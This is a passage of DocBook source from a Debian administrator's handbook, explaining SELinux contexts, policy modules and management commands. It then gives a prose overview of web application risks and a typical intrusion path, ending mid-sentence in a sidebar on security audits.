      <replaceable>domain_t</replaceable></command> (there is usually only a
      single domain allowed for a given role, the <literal>-t</literal>
      parameter can thus often be left out). This command authenticates you
      by asking you to type your password. This feature forbids programs to
      automatically switch roles. Such changes can only happen if they are
      explicitly allowed in the SELinux policy.</para>

      <para>Obviously the rights do not apply to all
      <emphasis>objects</emphasis> (files, directories, sockets, devices,
      etc.). They can vary from object to object. To achieve this, each
      object is associated to a <emphasis>type</emphasis> (this is known as
      labeling). Domains' rights are thus expressed with sets of
      (dis)allowed operations on those types (and, indirectly, on all
      objects which are labeled with the given type).</para>

      <sidebar>
        <title><emphasis>EXTRA</emphasis> Domains and types are equivalent</title>

	<para>Internally, a domain is just a type, but a type that only
	applies to processes. That is why domains are suffixed with
	<literal>_t</literal> just like objects' types.</para>
      </sidebar>

      <para>By default, a program inherits its domain from the user who
      started it, but the standard SELinux policies expect many important
      programs to run in dedicated domains. To achieve this, those
      executables are labeled with a dedicated type (for example
      <command>ssh</command> is labeled with
      <literal>ssh_exec_t</literal>, and when the program starts, it
      automatically switches to the <literal>ssh_t</literal> domain). This
      automatic domain transition mechanism makes it possible to grant only
      the rights required by each program. It is a fundamental principle of
      SELinux.</para>

      <figure>
        <title>Automatic transitions between domains</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/selinux-transitions.png" scalefit="1" width="35%"/>
          </imageobject>
        </mediaobject>
      </figure>

      <sidebar>
        <title><emphasis>IN PRACTICE</emphasis> Finding the security context</title>
        <indexterm><primary>security context</primary></indexterm>
        <indexterm><primary>context, security context</primary></indexterm>
        <indexterm><primary>MCS (<emphasis>Multi-Category Security</emphasis>)</primary></indexterm>

	<para>To find the security context of a given process, you should
	use the <literal>Z</literal> option of
	<command>ps</command>.</para>

        <screen><computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>
<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput>
</screen>

	<para>The first field contains the identity, the role, the domain
	and the MCS level, separated by colons. The MCS level
	(<emphasis>Multi-Category Security</emphasis>) is a parameter that
	intervenes in the setup of a confidentiality protection policy,
	which regulates the access to files based on their sensitivity.
	This feature will not be explained in this book.</para>

	<para>To find the current security context in a shell, you should
	call <command>id -Z</command>.</para>

        <screen><computeroutput>$ </computeroutput><userinput>id -Z</userinput>
<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput>
</screen>

	<para>Finally, to find the type assigned to a file, you can use
	<command>ls -Z</command>.</para>

        <screen><computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>
<computeroutput>unconfined_u:object_r:user_home_t:s0 test
     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput>
</screen>

	<para>It is worth noting that the identity and role assigned to a
	file bear no special importance (they are never used), but for the
	sake of uniformity, all objects get assigned a complete security
	context.</para>
      </sidebar>
    </section>
    <section id="sect.selinux-setup">
      <title>Setting Up SELinux</title>

      <para>SELinux support is built into the standard kernels provided by
      Debian. The core Unix tools support SELinux without any
      modifications. It is thus relatively easy to enable SELinux.</para>

      <para>The <command>apt install selinux-basics
      selinux-policy-default</command> command will automatically install
      the packages required to configure an SELinux system.</para>

      <para>The <emphasis role="pkg">selinux-policy-default</emphasis>
      package contains a set of standard rules. By default, this policy
      only restricts access for a few widely exposed services. The user
      sessions are not restricted and it is thus unlikely that SELinux
      would block legitimate user operations. However, this does enhance
      the security of system services running on the machine. To setup a
      policy equivalent to the old “strict” rules, you just have to
      disable the <literal>unconfined</literal> module (modules management
      is detailed further in this section).</para>

      <para>Once the policy has been installed, you should label all the
      available files (which means assigning them a type). This operation
      must be manually started with <command>fixfiles
      relabel</command>.</para>

      <para>The SELinux system is now ready. To enable it, you should add
      the <literal>selinux=1 security=selinux</literal> parameter to the Linux kernel. The
      <literal>audit=1</literal> parameter enables SELinux logging which
      records all the denied operations. Finally, the
      <literal>enforcing=1</literal> parameter brings the rules into
      application: without it SELinux works in its default
      <emphasis>permissive</emphasis> mode where denied actions are logged
      but still executed. You should thus modify the GRUB bootloader
      configuration file to append the desired parameters. One easy way to
      do this is to modify the <literal>GRUB_CMDLINE_LINUX</literal>
      variable in <filename>/etc/default/grub</filename> and to run
      <command>update-grub</command>. SELinux will be active after a
      reboot.</para>

      <para>It is worth noting that the <command>selinux-activate</command>
      script automates those operations and forces a labeling on next boot
      (which avoids new non-labeled files created while SELinux was not yet
      active and while the labeling was going on).</para>
    </section>
    <section id="sect.selinux-management">
      <title>Managing an SELinux System</title>
      <indexterm><primary><command>semodule</command></primary></indexterm>
      <indexterm><primary><command>semanage</command></primary></indexterm>

      <para>The SELinux policy is a modular set of rules, and its
      installation detects and enables automatically all the relevant
      modules based on the already installed services. The system is thus
      immediately operational. However, when a service is installed after
      the SELinux policy, you must be able to manually enable the
      corresponding module. That is the purpose of the
      <command>semodule</command> command. Furthermore, you must be able to
      define the roles that each user can endorse, and this can be done
      with the <command>semanage</command> command.</para>

      <para>Those two commands can thus be used to modify the current
      SELinux configuration, which is stored in
      <filename>/etc/selinux/default/</filename>. Unlike other
      configuration files that you can find in <filename>/etc/</filename>,
      all those files must not be changed by hand. You should use the
      programs designed for this purpose.</para>

      <sidebar>
        <title><emphasis>GOING FURTHER</emphasis> More documentation</title>

	<para>Since the NSA doesn't provide any official documentation, the
	community set up a wiki to compensate. It brings together a lot of
	information, but you must be aware that most SELinux contributors
	are Fedora users (where SELinux is enabled by default). The
	documentation thus tends to deal specifically with that
	distribution. <ulink type="block"
	url="https://selinuxproject.org"/></para>

	<para>You should also have a look at the dedicated Debian wiki page
	as well as Russell Coker's blog, who is one of the most active
	Debian developers working on SELinux support. <ulink type="block"
	url="https://wiki.debian.org/SELinux"/> <ulink type="block"
	url="https://etbe.coker.com.au/tag/selinux/"/></para>
      </sidebar>
      <section>
        <title>Managing SELinux Modules</title>

	<para>Available SELinux modules are stored in the
	<filename>/usr/share/selinux/default/</filename> directory. To
	enable one of these modules in the current configuration, you
	should use <command>semodule -i
	<replaceable>module.pp.bz2</replaceable></command>. The
	<emphasis>pp.bz2</emphasis> extension stands for <emphasis>policy
	package</emphasis> (compressed with bzip2).</para>

	<para>Removing a module from the current configuration is done with
	<command>semodule -r <replaceable>module</replaceable></command>.
	Finally, the <command>semodule -l</command> command lists the
	modules which are currently installed. It also outputs their version
        numbers. Modules can be selectively enabled with <command>semodule -e</command>
        and disabled with <command>semodule -d</command>.</para>

        <screen><computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/abrt.pp.bz2</userinput>
<computeroutput>libsemanage.semanage_direct_install_info: abrt module will be disabled after install as there is a disabled instance of this module present in the system.
# </computeroutput><userinput>semodule -l</userinput>
<computeroutput>accountsd
acct
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -e abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -d accountsd</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt
acct
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -r abrt</userinput>
<computeroutput>libsemanage.semanage_direct_remove_key: abrt module at priority 100 is now active.</computeroutput>
</screen>

	<para><command>semodule</command> immediately loads the new
	configuration unless you use its <literal>-n</literal> option. It
	is worth noting that the program acts by default on the current
	configuration (which is indicated by the
	<literal>SELINUXTYPE</literal> variable in
	<filename>/etc/selinux/config</filename>), but that you can modify
	another one by specifying it with the <literal>-s</literal>
	option.</para>
      </section>
      <section>
        <title>Managing Identities</title>

	<para>Every time that a user logs in, they get assigned an SELinux
	identity. This identity defines the roles that they will be able to
	endorse. Those two mappings (from the user to the identity and from
	this identity to roles) are configurable with the
	<command>semanage</command> command.</para>

	<para>You should definitely read the
	<citerefentry><refentrytitle>semanage</refentrytitle><manvolnum>8</manvolnum></citerefentry>
	manual page. All the managed concepts have their own manual
	page; for instance,
	<citerefentry><refentrytitle>semanage-login</refentrytitle><manvolnum>8</manvolnum></citerefentry>.
	Even if the command's syntax tends to be similar for all the
	concepts which are managed, it is recommended to read its
        manual page. You will find common options to
	most sub-commands: <literal>-a</literal> to add,
	<literal>-d</literal> to delete, <literal>-m</literal> to modify,
	<literal>-l</literal> to list, and <literal>-t</literal> to
	indicate a type (or domain).</para>

	<para><command>semanage login -l</command> lists the current
	mapping between user identifiers and SELinux identities. Users that
	have no explicit entry get the identity indicated in the
	<literal>__default__</literal> entry. The <command>semanage login
	-a -s user_u <replaceable>user</replaceable></command> command will
	associate the <emphasis>user_u</emphasis> identity to the given
	user. Finally, <command>semanage login -d
	<replaceable>user</replaceable></command> drops the mapping entry
	assigned to this user.</para>

        <screen><computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>
<computeroutput># </computeroutput><userinput>semanage login -l</userinput>
<computeroutput>
Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
rhertzog             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *
# </computeroutput><userinput>semanage login -d rhertzog</userinput>
</screen>

	<para><command>semanage user -l</command> lists the mapping between
	SELinux user identities and allowed roles. Adding a new identity
	requires to define both the corresponding roles and a labeling
	prefix which is used to assign a type to personal files
	(<filename>/home/<replaceable>user</replaceable>/*</filename>). The
	prefix must be picked among <literal>user</literal>,
	<literal>staff</literal>, and <literal>sysadm</literal>. The
	“<literal>staff</literal>” prefix results in files of type
	“<literal>staff_home_dir_t</literal>”. Creating a new SELinux
	user identity is done with <command>semanage user -a -R
	<replaceable>roles</replaceable> -P
	<replaceable>prefix</replaceable>
	<replaceable>identity</replaceable></command>. Finally, you can
	remove an SELinux user identity with <command>semanage user -d
	<replaceable>identity</replaceable></command>.</para>

        <screen><computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>
<computeroutput># </computeroutput><userinput>semanage user -l</userinput>
<computeroutput>
                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

root            sysadm     s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r
staff_u         staff      s0         s0-s0:c0.c1023                 staff_r sysadm_r
sysadm_u        sysadm     s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r
test_u          staff      s0         s0                             staff_r user_r
unconfined_u    unconfined s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
# </computeroutput><userinput>semanage user -d test_u</userinput>
</screen>
      </section>
      <section>
        <title>Managing File Contexts, Ports and Booleans</title>

	<para>Each SELinux module provides a set of file labeling rules,
	but it is also possible to add custom labeling rules to cater to a
	specific case. For example, if you want the web server to be able
	to read files within the <filename>/srv/www/</filename> file
	hierarchy, you could execute <command>semanage fcontext -a -t
	httpd_sys_content_t "/srv/www(/.*)?"</command> followed by
	<command>restorecon -R /srv/www/</command>. The former command
	registers the new labeling rules and the latter resets the file
	types according to the current labeling rules.</para>

	<para>Similarly, TCP/UDP ports are labeled in a way that ensures
	that only the corresponding daemons can listen to them. For
	instance, if you want the web server to be able to listen on port
	8080, you should run <command>semanage port -m -t http_port_t -p
	tcp 8080</command>.</para>

	<para>Some SELinux modules export boolean options that you can
	tweak to alter the behavior of the default rules. The
	<command>getsebool</command> utility can be used to inspect those
	options (<command>getsebool
	<replaceable>boolean</replaceable></command> displays one option,
	and <command>getsebool -a</command> them all). The
	<command>setsebool <replaceable>boolean</replaceable>
	<replaceable>value</replaceable></command> command changes the
	current value of a boolean option. The <literal>-P</literal> option
	makes the change permanent, it means that the new value becomes the
	default and will be kept across reboots. The example below grants
	web servers an access to home directories (this is useful when
	users have personal websites in
	<filename>~/public_html/</filename>).</para>

        <screen><computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>
<computeroutput>httpd_enable_homedirs --&gt; off
# </computeroutput><userinput>setsebool -P httpd_enable_homedirs on</userinput>
<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>
<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput>
</screen>
      </section>
    </section>
    <section id="sect.selinux-custom-rules">
      <title>Adapting the Rules</title>

      <para>Since the SELinux policy is modular, it might be interesting to
      develop new modules for (possibly custom) applications that lack
      them. These new modules will then complete the <emphasis>reference
      policy</emphasis>.</para>

      <para>To create new modules, the <emphasis
      role="pkg">selinux-policy-dev</emphasis> package is required, as well
      as <emphasis role="pkg">selinux-policy-doc</emphasis>. The latter
      contains the documentation of the standard rules
      (<filename>/usr/share/doc/selinux-policy-doc/html/</filename>) and
      sample files that can be used as templates to create new modules.
      Install those files and study them more closely:</para>

      <screen><computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/Makefile.example Makefile</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.fc ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.if ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput>
</screen>

      <para>The <filename>.te</filename> file is the most important one. It
      defines the rules. The <filename>.fc</filename> file defines the
      “file contexts”, that is the types assigned to files related to
      this module. The data within the <filename>.fc</filename> file are
      used during the file labeling step. Finally, the
      <filename>.if</filename> file defines the interface of the module:
      it is a set of “public functions” that other modules can use to
      properly interact with the module that you're creating.</para>
      <section>
        <title>Writing a <filename>.fc</filename> file</title>

	<para>Reading the below example should be sufficient to understand
	the structure of such a file. You can use regular expressions to
	assign the same security context to multiple files, or even an
	entire directory tree.</para>

        <example>
          <title><filename>example.fc</filename> file</title>

          <programlisting role="scale"># myapp executable will have:
# label: system_u:object_r:myapp_exec_t
# MLS sensitivity: s0
# MCS categories: &lt;none&gt;

/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)
</programlisting>
        </example>
      </section>
      <section>
        <title>Writing a <filename>.if</filename> File</title>

	<para>In the sample below, the first interface
	(“<literal>myapp_domtrans</literal>”) controls who can execute
	the application. The second one
	(“<literal>myapp_read_log</literal>”) grants read rights on the
	application's log files.</para>

	<para>Each interface must generate a valid set of rules which can
	be embedded in a <filename>.te</filename> file. You should thus
	declare all the types that you use (with the
	<literal>gen_require</literal> macro), and use standard directives
	to grant rights. Note, however, that you can use interfaces
	provided by other modules. The next section will give more
	explanations about how to express those rights.</para>

        <example>
          <title><filename>example.if</filename> File</title>

          <programlisting>## &lt;summary&gt;Myapp example policy&lt;/summary&gt;
## &lt;desc&gt;
##      &lt;p&gt;
##              More descriptive text about myapp.  The &lt;desc&gt;
##              tag can also use &lt;p&gt;, &lt;ul&gt;, and &lt;ol&gt;
##              html tags for formatting.
##      &lt;/p&gt;
##      &lt;p&gt;
##              This policy supports the following myapp features:
##              &lt;ul&gt;
##              &lt;li&gt;Feature A&lt;/li&gt;
##              &lt;li&gt;Feature B&lt;/li&gt;
##              &lt;li&gt;Feature C&lt;/li&gt;
##              &lt;/ul&gt;
##      &lt;/p&gt;
## &lt;/desc&gt;
#

########################################
## &lt;summary&gt;
##      Execute a domain transition to run myapp.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Domain allowed to transition.
## &lt;/param&gt;
#
interface(`myapp_domtrans',`
        gen_require(`
                type myapp_t, myapp_exec_t;
        ')

        domtrans_pattern($1,myapp_exec_t,myapp_t)
')

########################################
## &lt;summary&gt;
##      Read myapp log files.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Domain allowed to read the log files.
## &lt;/param&gt;
#
interface(`myapp_read_log',`
        gen_require(`
                type myapp_log_t;
        ')

        logging_search_logs($1)
        allow $1 myapp_log_t:file r_file_perms;
')
</programlisting>
        </example>

        <sidebar>
          <title><emphasis>DOCUMENTATION</emphasis> Explanations about the <emphasis>reference policy</emphasis></title>

	  <para>The <emphasis>reference policy</emphasis> evolves like any
	  free software project: based on volunteer contributions. The
	  project is hosted by Tresys, one of the most active companies in
	  the SELinux field. Their wiki contains explanations on how the
	  rules are structured and how you can create new ones. <ulink
	  type="block"
	  url="https://github.com/SELinuxProject/refpolicy/wiki/GettingStarted"/></para>
        </sidebar>
      </section>
      <section id="sect.writing-a-te-file">
        <title>Writing a <filename>.te</filename> File</title>

	<para>Have a look at the <filename>example.te</filename>
	file:</para>

        <sidebar>
          <title><emphasis>GOING FURTHER</emphasis> The <command>m4</command> macro language</title>

	  <para>To properly structure the policy, the SELinux developers
	  used a macro-command processor. Instead of duplicating many
	  similar <emphasis>allow</emphasis> directives, they created
	  “macro functions” to use a higher-level logic, which also
	  results in a much more readable policy.</para>

	  <para>In practice, <command>m4</command> is used to compile those
	  rules. It does the opposite operation: it expands all those
	  high-level directives into a huge database of
	  <emphasis>allow</emphasis> directives.</para>

	  <para>The SELinux “interfaces” are only macro functions which
	  will be substituted by a set of rules at compilation time.
	  Likewise, some rights are in fact sets of rights which are
	  replaced by their values at compilation time.</para>
        </sidebar>

        <programlisting>policy_module(myapp,1.0.0) <co id="example.te.module"/>

########################################
#
# Declarations
#

type myapp_t; <co id="example.te.type"/>
type myapp_exec_t;
domain_type(myapp_t)
domain_entry_file(myapp_t, myapp_exec_t) <co id="example.te.domain"/>

type myapp_log_t;
logging_log_file(myapp_log_t) <co id="example.te.interface"/>

type myapp_tmp_t;
files_tmp_file(myapp_tmp_t)

########################################
#
# Myapp local policy
#

allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co id="example.te.allow"/>

allow myapp_t myapp_tmp_t:file manage_file_perms;
files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
</programlisting>
        <calloutlist>
          <callout arearefs="example.te.module">
	    <para>The module must be identified by its name and version
	    number. This directive is required.</para>
          </callout>
          <callout arearefs="example.te.type">
	    <para>If the module introduces new types, it must declare them
	    with directives like this one. Do not hesitate to create as
	    many types as required rather than granting too many useless
	    rights.</para>
          </callout>
          <callout arearefs="example.te.domain">
	    <para>Those interfaces define the <literal>myapp_t</literal>
	    type as a process domain that should be used by any executable
	    labeled with <literal>myapp_exec_t</literal>. Implicitly, this
	    adds an <literal>exec_type</literal> attribute on those
	    objects, which in turn allows other modules to grant rights to
	    execute those programs: for instance, the
	    <literal>userdomain</literal> module allows processes with
	    domains <literal>user_t</literal>, <literal>staff_t</literal>,
	    and <literal>sysadm_t</literal> to execute them. The domains of
	    other confined applications will not have the rights to execute
	    them, unless the rules grant them similar rights (this is the
	    case, for example, of <command>dpkg</command> with its
	    <literal>dpkg_t</literal> domain).</para>
          </callout>
          <callout arearefs="example.te.interface">
	    <para><literal>logging_log_file</literal> is an interface
	    provided by the reference policy. It indicates that files
	    labeled with the given type are log files which ought to
	    benefit from the associated rules (for example, granting rights
	    to <command>logrotate</command> so that it can manipulate
	    them).</para>
          </callout>
          <callout arearefs="example.te.allow">
	    <para>The <literal>allow</literal> directive is the base
	    directive used to authorize an operation. The first parameter
	    is the process domain which is allowed to execute the
	    operation. The second one defines the object that a process of
	    the former domain can manipulate. This parameter is of the form
	    “<replaceable>type</replaceable>:<replaceable>class</replaceable>“
	    where <replaceable>type</replaceable> is its SELinux type and
	    <replaceable>class</replaceable> describes the nature of the
	    object (file, directory, socket, fifo, etc.). Finally, the last
	    parameter describes the permissions (the allowed
	    operations).</para>

	    <para>Permissions are defined as the set of allowed operations
	    and follow this template: <literal>{
	    <replaceable>operation1</replaceable>
	    <replaceable>operation2</replaceable> }</literal>. However, you
	    can also use macros representing the most useful permissions.
	    The
	    <filename>/usr/share/selinux/devel/include/support/obj_perm_sets.spt</filename>
	    lists them.</para>

	    <para>The following web page provides a relatively exhaustive
	    list of object classes, and permissions that can be granted.
	    <ulink type="block"
	    url="https://selinuxproject.org/page/ObjectClassesPerms"/></para>
          </callout>
        </calloutlist>

	<para>Now you just have to find the minimal set of rules required
	to ensure that the target application or service works properly. To
	achieve this, you should have a good knowledge of how the
	application works and of what kind of data it manages and/or
	generates.</para>

	<para>However, an empirical approach is possible. Once the
	relevant objects are correctly labeled, you can use the
	application in permissive mode: the operations that would be
	forbidden are logged but still succeed. By analyzing the logs, you
	can now identify the operations to allow. Here is an example of
	such a log entry:</para>

        <programlisting>avc:  denied  { read write } for  pid=1876 comm="syslogd" name="xconsole" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file permissive=1
</programlisting>

	<para>To better understand this message, let us study it piece by
	piece.</para>

        <table colsep="1">
          <title>Analysis of an SELinux trace</title>
          <tgroup cols="2">
            <thead>
              <row>
                <entry>Message</entry>
                <entry>Description</entry>
              </row>
            </thead>
            <tbody>
              <row>
                <entry>
                  <computeroutput>avc: denied</computeroutput>
                </entry>
                <entry>An operation has been denied.</entry>
              </row>
              <row>
                <entry>
                  <computeroutput>{ read write }</computeroutput>
                </entry>
                <entry>This operation required the <literal>read</literal> and <literal>write</literal> permissions.</entry>
              </row>
              <row>
                <entry>
                  <computeroutput>pid=1876</computeroutput>
                </entry>
                <entry>The process with PID 1876 executed the operation (or tried to execute it).</entry>
              </row>
              <row>
                <entry>
                  <computeroutput>comm="syslogd"</computeroutput>
                </entry>
                <entry>The process was an instance of the <literal>syslogd</literal> program.</entry>
              </row>
              <row>
                <entry>
                  <computeroutput>name="xconsole"</computeroutput>
                </entry>
                <entry>The target object was named <literal>xconsole</literal>. Sometimes you can also have a “path” variable — with the full path — instead.</entry>
              </row>
              <row>
                <entry>
                  <computeroutput>dev=tmpfs</computeroutput>
                </entry>
                <entry>The device hosting the target object is a <literal>tmpfs</literal> (an in-memory filesystem). For a real disk, you could see the partition hosting the object (for example, “sda3”).</entry>
              </row>
              <row>
                <entry>
                  <computeroutput>ino=5510</computeroutput>
                </entry>
                <entry>The object is identified by the inode number 5510.</entry>
              </row>
              <row>
                <entry>
                  <computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput>
                </entry>
                <entry>This is the security context of the process who executed the operation.</entry>
              </row>
              <row>
                <entry>
                  <computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput>
                </entry>
                <entry>This is the security context of the target object.</entry>
              </row>
              <row>
                <entry>
                  <computeroutput>tclass=fifo_file</computeroutput>
                </entry>
                <entry>The target object is a FIFO file.</entry>
              </row>
            </tbody>
          </tgroup>
        </table>

	<para>By observing this log entry, it is possible to build a rule
	that would allow this operation. For example, <literal>allow
	syslogd_t device_t:fifo_file { read write }</literal>. This process
	can be automated, and it is exactly what the
	<command>audit2allow</command> command (of the <emphasis
	role="pkg">policycoreutils</emphasis> package) offers. This
	approach is only useful if the various objects are already
	correctly labeled according to what must be confined. In any case,
	you will have to carefully review the generated rules and validate
	them according to your knowledge of the application. Effectively,
	this approach tends to grant more rights than are really required.
	The proper solution is often to create new types and to grant
	rights on those types only. It also happens that a denied operation
	isn't fatal to the application, in which case it might be better to
	just add a “<literal>dontaudit</literal>” rule to avoid the log
	entry despite the effective denial.</para>

        <sidebar>
          <title><emphasis>COMPLEMENTS</emphasis> No roles in policy rules</title>
          <indexterm><primary>Type Enforcement</primary></indexterm>
          <indexterm><primary>Enforcement, Type Enforcement</primary></indexterm>

	  <para>It might seem weird that roles do not appear at all when
	  creating new rules. SELinux uses only the domains to find out
	  which operations are allowed. The role intervenes only indirectly
	  by allowing the user to switch to another domain. SELinux is
	  based on a theory known as <emphasis>Type Enforcement</emphasis>
	  and the type is the only element that matters when granting
	  rights.</para>
        </sidebar>
      </section>
      <section>
        <title>Compiling the Files</title>

	<para>Once the 3 files (<filename>example.if</filename>,
	<filename>example.fc</filename>, and
	<filename>example.te</filename>) match your expectations for the
	new rules, rename them to <filename>myapp.<replaceable>extension</replaceable></filename>
        and run <command>make NAME=devel</command> to generate a module in
	the <filename>myapp.pp</filename> file (you can immediately load
	it with <command>semodule -i myapp.pp</command>). If several
	modules are defined, <command>make</command> will create all the
	corresponding <filename>.pp</filename> files.</para>
      </section>
    </section>
  </section>
  <section id="sect.other-security-considerations">
    <title>Other Security-Related Considerations</title>

    <para>Security is not just a technical problem; more than anything,
    it is about good practices and understanding the risks. This section
    reviews some of the more common risks, as well as a few best practices
    which should, depending on the case, increase security or lessen the
    impact of a successful attack.</para>
    <section>
      <title>Inherent Risks of Web Applications</title>

      <para>The universal character of web applications led to their
      proliferation. Several are often run in parallel: a webmail, a wiki,
      some groupware system, forums, a photo gallery, a blog, and so on.
      Many of those applications rely on the “LAMP” (<emphasis>Linux,
      Apache, MySQL, PHP</emphasis>) stack. Unfortunately, many of those
      applications were also written without much consideration for
      security problems. Data coming from outside is, too often, used with
      little or no validation. Providing specially-crafted values can be
      used to subvert a call to a command so that another one is executed
      instead. Many of the most obvious problems have been fixed as time
      has passed, but new security problems pop up regularly.</para>

      <sidebar>
        <title><emphasis>VOCABULARY</emphasis> SQL injection</title>

	<para>When a program inserts data into SQL queries in an insecure
	manner, it becomes vulnerable to SQL injections; this name covers
	the act of changing a parameter in such a way that the actual query
	executed by the program is different from the intended one, either
	to damage the database or to access data that should normally not
	be accessible. <ulink type="block"
	url="https://en.wikipedia.org/wiki/SQL_Injection"/></para>
        <indexterm><primary>SQL injection</primary></indexterm>
      </sidebar>

      <para>Updating web applications regularly is therefore a must, lest
      any cracker (whether a professional attacker or a script kiddy) can
      exploit a known vulnerability. The actual risk depends on the case,
      and ranges from data destruction to arbitrary code execution,
      including web site defacement.</para>
    </section>
    <section>
      <title>Knowing What To Expect</title>

      <para>A vulnerability in a web application is often used as a
      starting point for cracking attempts. What follows is a short review
      of possible consequences.</para>

      <sidebar>
        <title><emphasis>QUICK LOOK</emphasis> Filtering HTTP queries</title>

	<para>Apache 2 includes modules allowing filtering incoming HTTP
	queries. This allows blocking some attack vectors. For instance,
	limiting the length of parameters can prevent buffer overflows.
	More generally, one can validate parameters before they are even
	passed to the web application and restrict access along many
	criteria. This can even be combined with dynamic firewall updates,
	so that a client infringing one of the rules is banned from
	accessing the web server for a given period of time.</para>

	<para>Setting up these checks can be a long and cumbersome task,
	but it can pay off when the web application to be deployed has a
	dubious track record where security is concerned.</para>

	<para><emphasis>mod-security2</emphasis> (in the <emphasis
	role="pkg">libapache2-mod-security2</emphasis> package) is the main
        such module. It even comes with many ready-to-use rules of its own
        (in the <emphasis role="pkg">modsecurity-crs</emphasis> package)
        that you can easily enable.</para>
        <indexterm><primary><emphasis role="pkg">libapache-mod-security</emphasis></primary></indexterm>
        <indexterm><primary><emphasis>mod-security</emphasis></primary></indexterm>
      </sidebar>

      <para>The consequences of an intrusion will have various levels of
      obviousness depending on the motivations of the attacker.
      <emphasis>Script-kiddies</emphasis> only apply recipes they find on
      web sites; most often, they deface a web page or delete data. In more
      subtle cases, they add invisible contents to web pages so as to
      improve referrals to their own sites in search engines.</para>

      <para>A more advanced attacker will go beyond that. A disaster
      scenario could go on in the following fashion: the attacker gains the
      ability to execute commands as the <literal>www-data</literal> user,
      but executing a command requires many manipulations. To make their
      life easier, they install other web applications specially designed
      to remotely execute many kinds of commands, such as browsing the
      filesystem, examining permissions, uploading or downloading files,
      executing commands, and even provide a network shell. Often, the
      vulnerability will allow running a <command>wget</command> command
      that will download some malware into <filename>/tmp/</filename>, then
      executing it. The malware is often downloaded from a foreign website
      that was previously compromised, in order to cover tracks and make it
      harder to find out the actual origin of the attack.</para>

      <para>At this point, the attacker has enough freedom of movement that
      they often install an IRC <emphasis>bot</emphasis> (a robot that
      connects to an IRC server and can be controlled by this channel).
      This bot is often used to share illegal files (unauthorized copies of
      movies or software, and so on). A determined attacker may want to go
      even further. The <literal>www-data</literal> account does not allow
      full access to the machine, and the attacker will try to obtain
      administrator privileges. Now, this should not be possible, but if
      the web application was not up-to-date, chances are that the kernel
      and other programs are outdated too; this sometimes follows a
      decision from the administrator who, despite knowing about the
      vulnerability, neglected to upgrade the system since there are no
      local users. The attacker can then take advantage of this second
      vulnerability to get root access.</para>

      <sidebar>
        <title><emphasis>VOCABULARY</emphasis> Privilege escalation</title>

	<para>This term covers anything that can be used to obtain more
	permissions than a given user should normally have. The
	<command>sudo</command> program is designed for precisely the
	purpose of giving administrative rights to some users. But the same
	term is also used to describe the act of an attacker exploiting a
	vulnerability to obtain undue rights.</para>
      </sidebar>

      <para>Now the attacker owns the machine; they will usually try to
      keep this privileged access for as long as possible. This involves
      installing a <emphasis>rootkit</emphasis>, a program that will
      replace some components of the system so that the attacker will be
      able to obtain the administrator privileges again at a later time;
      the rootkit also tries hiding its own existence as well as any traces
      of the intrusion. A subverted <command>ps</command> program will omit
      to list some processes, <command>netstat</command> will not list some
      of the active connections, and so on. Using the root permissions, the
      attacker was able to observe the whole system, but didn't find
      important data; so they will try accessing other machines in the
      corporate network. Analyzing the administrator's account and the
      history files, the attacker finds what machines are routinely
      accessed. By replacing <command>sudo</command> or
      <command>ssh</command> with a subverted program, the attacker can
      intercept some of the administrator's passwords, which they will use
      on the detected servers… and the intrusion can propagate from then
      on.</para>

      <para>This is a nightmare scenario which can be prevented by several
      measures. The next few sections describe some of these
      measures.</para>
    </section>
    <section id="sect.choosing-the-software-wisely">
      <title>Choosing the Software Wisely</title>

      <para>Once the potential security problems are known, they must be
      taken into account at each step of the process of deploying a
      service, especially when choosing the software to install. Many web
      sites, such as <literal>SecurityFocus.com</literal>, keep a list of
      recently-discovered vulnerabilities, which can give an idea of a
      security track record before some particular software is deployed. Of
      course, this information must be balanced against the popularity of
      said software: a more widely-used program is a more tempting target,
      and it will be more closely scrutinized as a consequence. On the
      other hand, a niche program may be full of security holes that never
      get publicized due to a lack of interest in a security audit.</para>

      <sidebar>
        <title><emphasis>VOCABULARY</emphasis> Security audit</title>

	<para>A security audit is the process of thoroughly reading and
	analyzing the source code of some software, looking for potential
